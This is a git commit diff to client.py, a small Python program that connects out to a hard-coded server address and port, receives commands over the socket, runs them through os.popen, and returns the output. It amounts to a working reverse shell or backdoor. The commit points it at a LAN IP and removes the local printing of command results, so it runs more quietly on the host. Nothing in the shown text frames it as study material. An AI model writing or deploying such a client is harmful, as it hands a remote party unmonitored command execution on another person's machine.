c2d103a2821bb980f15a118a82912908b933ffb8
Banji <38909289+TheBanji@users.noreply.github.com>
2019-08-21 17:32:45 +0200

    Update client.py

--- client.py
+++ client.py
@@ -1,6 +1,6 @@
 import socket, os
 
-host = ("0.0.0.0", 1234) # IP of the server
+host = ("192.168.1.18", 1234) # IP of the server
 
 socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -14,10 +14,11 @@ while(1):
 		command = str(socket.recv(2048).decode())
 		if("".join(list(command)[0:2]) != "st"):
 			result = os.popen(command).read()
-			print("result : " + result)
+			if(result == ""):
+				result = "Done."
 			socket.send(result.encode())
 		else:
 			os.popen(command)
 			socket.send(("".join(list(command)[6:]) + " successfully started.").encode())
 	except Exception as err:
-		socket.send(("Wrong command ! {}".format(err)).encode())
+		socket.send("Wrong command !".encode())
